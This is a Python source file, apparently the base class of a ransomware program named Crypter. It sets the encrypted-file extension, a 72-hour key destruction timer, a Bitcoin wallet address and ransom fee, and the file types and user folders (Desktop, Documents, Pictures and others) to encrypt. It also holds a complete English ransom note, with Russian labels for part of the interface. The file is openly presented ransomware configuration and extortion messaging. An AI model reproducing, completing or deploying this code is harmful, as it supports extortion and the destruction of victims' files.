# -*- coding: utf-8 -*-
'''
@summary: Crypter: Base class for inheritence
@author: MLS
'''

# Import libs
import os
import locale

# Import classes

################
## Base class ##
################
class Base():
    '''
    @summary: Base Class. Defines schema for Crypter
    @todo: Continue with defining GUI schema
    '''

    # CORE SCHEMA
    ENCRYPTED_EXTENSION = ".locked"
    BLOCK_SIZE_BYTES = 8192
    IV_SIZE = 16
    PADDING_BLOCK_SIZE = 16
    MAX_FILE_SIZE_BYTES = 536870912
    KEY_DESTRUCT_TIME_SECONDS = 259200
    REGISTRY_LOCATION = r"SOFTWARE\\Crypter"
    WALLET_ADDRESS = "12mdKVNfAhLbRDLtRWQFhQgydgU6bUMjay"
    BITCOIN_FEE = "0.5"
    # TODO Determine dynamically what the language will be

    # Get locale 
    if "ru" in locale.getdefaultlocale():
        LANG = "ru"
    else:
        LANG = "eng"
    
    # GUI SCHEMA
    GUI_IMAGE_LOGO = "crypter_logo_small.bmp"
    GUI_LABEL_TEXT_TITLE = {
        "eng": "CRYPTER",
        "ru": u"КРИПТЕР"
        }
    GUI_LABEL_TEXT_FLASHING_ENCRYPTED = {
        "eng": "YOUR FILES HAVE BEEN ENCRYPTED!",
        "ru": u"ВАШИ ФАЙЛИ БЫЛИ ЗАШИФРАНЫ!"
    }
    GUI_LABEL_TEXT_FLASHING_DECRYPTED = {
        "eng": "YOUR FILES HAVE BEEN DECRYPTED!",
        "ru": u"ВАШИ ФАЙЛЫ БЫЛИ РАСШИФРАНЫ!"
    }
    GUI_LABEL_TEXT_KEY_DESTRUCTION = {
        "eng": "KEY DESTRUCTION IN: ",
        "ru": u"РАЗРУШЕНИЕ КЛЮЧА ЧЕРЕЗ: "
    }
    GUI_LABEL_TEXT_WALLET_ADDRESS = {
        "eng": "WALLET ADDRESS: ",
        "ru": u"АДРЕС КОШЕЛЬКА: "
    }
    GUI_LABEL_TEXT_FILES_DECRYPTED = {
        "eng": "FILES DECRYPTED",
        "ru": u"ФАЙЛЫ РАСШИФРАНЫ"
    }
    GUI_LABEL_TEXT_KEY_DESTROYED = {
        "eng": "KEY DESTROYED",
        "ru": u"KEY DESTROYED"
    }
    GUI_BUTTON_TEXT_VIEW_ENCRYPTED_FILES = {
        "eng": "View Encrypted Files",
        "ru": u"View Encrypted Files"
    }
    GUI_BUTTON_TEXT_ENTER_DECRYPTION_KEY = {
        "eng": "Enter Decryption Key",
        "ru": u"Enter Decryption Key"
    }
    GUI_DECRYPTION_DIALOG_LABEL_TEXT_INVALID_KEY = {
        "eng": "Invalid Key!",
        "ru": u"Invalid Key!"
    }
    GUI_DECRYPTION_DIALOG_LABEL_TEXT_WAITING = {
        "eng": "Waiting for input",
        "ru": u"Waiting for input"
    }
    GUI_DECRYPTION_DIALOG_LABEL_TEXT_DECRYPTING = {
        "eng": "Decrypting! Please Wait",
        "ru": u"Decrypting! Please Wait"
    }
    GUI_DECRYPTION_DIALOG_LABEL_TEXT_FINISHED = {
        "eng": "Decryption Complete!",
        "ru": u"Decryption Complete!"
    }
    GUI_DECRYPTION_DIALOG_LABEL_TEXT_FILE_COUNT = {
        "eng": "Encrypted Files: ",
        "ru": u"Encrypted Files: "
    }
    GUI_ENCRYPTED_FILES_DIALOG_NO_FILES_FOUND = {
        "eng": "A list of encrypted files was not found",
        "ru": u"A list of encrypted files was not found"
    }
    
    GUI_RANSOM_MESSAGE = {
        "eng": (
          "The important files on your computer have been encrypted with"
          " military grade AES-256 bit encryption.\n\nYour documents, videos"
          " images and other forms of data are now inaccessible, and cannot"
          " be unlocked without the decryption key. This key is currently"
          " being stored on a remote server.\n\nTo acquire this key, transfer"
          " a total of %s BTC to the Bitcoin wallet address below within %s"
          " hours.\n\nIf you fail to take action within this time window,"
          " the decryption key will be destroyed and access to your files"
          " will be permanently lost." % 
          (BITCOIN_FEE, (KEY_DESTRUCT_TIME_SECONDS / 60 / 60))
          ),
        "ru": (
          u"The important files on your computer have been encrypted with"
          u" military grade AES-256 bit encryption.\n\nYour documents, videos"
          u" images and other forms of data are now inaccessible, and cannot"
          u" be unlocked without the decryption key. This key is currently"
          u" being stored on a remote server.\n\nTo acquire this key, transfer"
          u" a total of %s BTC to the Bitcoin wallet address below within %s"
          u" hours.\n\nIf you fail to take action within this time window,"
          u" the decryption key will be destroyed and access to your files"
          u" will be permanently lost." % 
          (BITCOIN_FEE, (KEY_DESTRUCT_TIME_SECONDS / 60 / 60))
          )
        }
                          

    FILETYPES = [
                # GENERAL FORMATS
                "sln",

                # IMAGE FORMATS
                "jpg", "png",

                # VIDEO FORMATS
                "mp4", "avi", "mkv",

                # DOCUMENT FORMATS
                "doc", "docx", "txt", "pdf",

                # SOUND FORMATS
                "mp3",

                # EXE FORMATS
                "exe", "msi", "php",

                # COMPRESSION FORMATS
                "tgz", "zip", "rar"
                ]
    
    
    FILES_TO_EXCLUDE = [
        "key.txt"
        ]
    

    def get_base_dirs(self, home_dir):
      # Function to return a list of base directories to encrypt
      # TODO Detect presence of network drives
      # TODO Improve overall functionality for getting list of locations to encrypt
      # TODO Consider language support here... Should be fine as Windows preserves eng paths

      base_dirs = [
                    os.path.join(home_dir, "Desktop"),
                    os.path.join(home_dir, "Documents"),
                    os.path.join(home_dir, "Downloads"),
                    os.path.join(home_dir, "Music"),
                    os.path.join(home_dir, "Pictures"),
                    os.path.join(home_dir, "Videos")
                  ]

      return base_dirs

